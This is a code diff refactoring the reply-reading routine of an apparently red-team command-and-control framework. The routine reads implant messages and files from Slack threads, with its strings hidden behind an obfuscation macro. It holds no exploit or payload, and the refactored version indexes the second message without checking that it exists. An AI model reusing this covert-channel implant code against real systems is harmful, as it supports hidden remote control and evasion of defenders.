@@ -94,37 +94,35 @@ std::vector<std::pair<std::string, std::string>> FSecure::Slack::ReadReplies(std
 {
 	std::string url = OBF("https://slack.com/api/channels.replies?channel=") + this->m_Channel + OBF("&thread_ts=") + timestamp;
 	json output = SendJsonRequest(url, NULL);
-	std::vector<std::pair<std::string, std::string>> ret;
 
 	//This logic is really messy, in reality the checks are over cautious, however there is an edgecase
 	//whereby a message could be created with no replies of the implant that wrote triggers an exception or gets killed.
 	//If that was the case, and we didn't sanity check, we could run into problems.
-	if (output.contains(OBF("messages")))
+	if (!output.contains(OBF("messages")))
+		return {};
+
+	json const& messages = output[OBF("messages")];
+	if (!messages[0].contains(OBF("replies")))
+		return {};
+
+	std::vector<std::pair<std::string, std::string>> ret;
+	if (auto const& firstReply = messages[1]; firstReply.contains(OBF("files"))) //the reply contains a file, handle this differently
 	{
-		json const& m = output[OBF("messages")];
-		if (m[0].contains(OBF("replies")) && m[0].size() > 1)
-		{
-			if (m[1].contains(OBF("files"))) //the reply contains a file, handle this differently
-			{
-				std::string ts = m[1][OBF("ts")];
-				std::string fileUrl = m[1][OBF("files")][0][OBF("url_private")].get<std::string>();
-				std::string text = GetFile(fileUrl);
-				ret.emplace_back(std::move(ts), std::move(text));
-			}
-			else
-			{
-				for (size_t i = 1u; i < m.size(); i++) //skip the first message (it doesn't contain the data we want).
-				{
-					auto ts = m[i][OBF("ts")].get<std::string>();
-					auto text = m[i][OBF("text")].get<std::string>();
-					ret.emplace_back(std::move(ts), std::move(text));
-				}
-
-			}
-		}
-
+		std::string ts = firstReply[OBF("ts")];
+		std::string fileUrl = firstReply[OBF("files")][0][OBF("url_private")].get<std::string>();
+		std::string text = GetFile(fileUrl);
+		ret.emplace_back(std::move(ts), std::move(text));
 	}
-
+	else
+	{
+		for (size_t i = 1u; i < messages.size(); i++) //skip the first message (parent message) (it doesn't contain the data we want).
+		{
+			auto& reply = messages[i];
+			auto ts = reply[OBF("ts")].get<std::string>();
+			auto text = reply[OBF("text")].get<std::string>();
+			ret.emplace_back(std::move(ts), std::move(text));
+		}
+	}
 	return ret;
 }
 
